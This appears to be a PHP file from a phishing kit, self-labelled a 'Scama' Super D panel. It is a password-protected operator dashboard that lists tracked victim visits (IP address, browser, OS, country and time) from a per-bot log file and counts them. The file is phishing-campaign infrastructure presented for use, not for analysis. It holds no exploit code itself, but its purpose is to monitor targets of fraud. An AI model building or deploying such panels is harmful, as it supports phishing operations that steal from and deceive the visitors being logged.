<?php
@ini_set('display_errors', 'on');
include'../track/id.php';

	 //** Scama Version Super D panel - 12-11-2020  x

	  

// Le mot de passe n'a pas été envoyé ou n'est pas bon
if (!isset($_POST['pass']) OR $_POST['pass'] != $pass)
{
	// Afficher le formulaire de saisie du mot de passe
 ?>
 <link rel='stylesheet' type='text/css' href='../track/zebna_fichiers/bootstrap.css'>
	<link href='../track/zebna_fichiers/flat-ui.css' rel='stylesheet'>
    <link href='../track/zebna_fichiers/demo.css' rel='stylesheet'>
	<body>
      <div class="demo-headline">
        <h1 class="demo-logo">
          <div class="logo"></div>
        </h1>
      </div> <!-- /demo-headline -->
	  <div class='lead'>
	 <div class="login">
   <div class="login-form">

<form action="" method='post'>

<table align="center" border="0">

  <tr>
 
    <td><div class="form-group">
              <input type="password" class="form-control login-field" value="" name="pass" placeholder="Password" id="pass">
              <label class="login-field-icon fui-lock" for="login-pass"></label>
            </div></td>
  </tr><br>
  <tr> <td> <input name="submit" class="btn btn-primary btn-lg btn-block" type="submit" value="log in"></td></tr>
</table>

</form> 
</div></div> </div>

<?php
} 
else 
{ ?>
	<head><meta http-equiv='Content-Language' content='en-us'></head>
	<title>SUPER "D"</title>
	<link rel='stylesheet' type='text/css' href='../track/zebna_fichiers/bootstrap.css'>
	<link href='../track/zebna_fichiers/flat-ui.css' rel='stylesheet'>
    <link href='../track/zebna_fichiers/demo.css' rel='stylesheet'>
   <script type='text/javascript' src='../track/zebna_fichiers/modernizr.min.js'></script>
   <script src='../track/zebna_fichiers/jquery.js'></script>
	</link>
	<div class='container'>
	<body>
	<div class='demo-headline'>
	<h1 class='demo-logo'>
          <div class='logo'></div>
        </h1>
		</div>
	<nav class='navbar navbar-default' role='navigation'>
  <div class='navbar-header'>
    <button type='button' class='navbar-toggle' data-toggle='collapse' data-target='#navbar-collapse-01'>
      <span class='sr-only'>Toggle navigation</span>
    </button>
    <a class='navbar-brand' href='#' id='load01'>Home</a>
  </div>
  <div class='collapse navbar-collapse' id='navbar-collapse-01'>

  </div><!-- /.navbar-collapse -->
 
</nav><!-- /navbar --> 
		<div align='center' id='01' style=''>
		<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
        // document.getElementById('fixed').style.visibility="hidden";
            var rowCount = $("#vis td").closest("tr").length;
            var message = rowCount;
			document.getElementById('lbl').innerText = message;
      },);
  }
}
   
</script>

	
<style>

</style>

<div class="main-overview">
  <div class="overviewcard">
    <div class="overviewcard__icon"><svg  width="3em" height="3em" viewBox="0 0 16 16"  fill="currentColor" class="bi bi-eye">
  <path fill-rule="evenodd" d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.134 13.134 0 0 0 1.66 2.043C4.12 11.332 5.88 12.5 8 12.5c2.12 0 3.879-1.168 5.168-2.457A13.134 13.134 0 0 0 14.828 8a13.133 13.133 0 0 0-1.66-2.043C11.879 4.668 10.119 3.5 8 3.5c-2.12 0-3.879 1.168-5.168 2.457A13.133 13.133 0 0 0 1.172 8z"/>
  <path fill-rule="evenodd" d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
</svg></div>
    <div id="lbl" class="overviewcard__info"></div>
  </div>
</div>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

	<h3>Visiteur  <span class='fui-eye'></span></h3><br>
<table id='vis' width='76' class='table table-hover'>
		
		<tr>
			<th width='80'>
			<p align='center'>IP</td>
			<th width='80'>
            <p align='center'>browser</td>
			<th width='80'>
            <p align='center'>os</td>
			<th width='30'>
			<p align='center'>Country</td>
			<th width='80'>
			<p align='center'>Date & time</td>
		</tr>
		 <div id="3">
<?php  if (file_exists(''.$botid.'.html')){ include ''.$botid.'.html'; }else{echo "0 Visiteur";} ?>
</div>
</table></div>
<?php
} 
?>

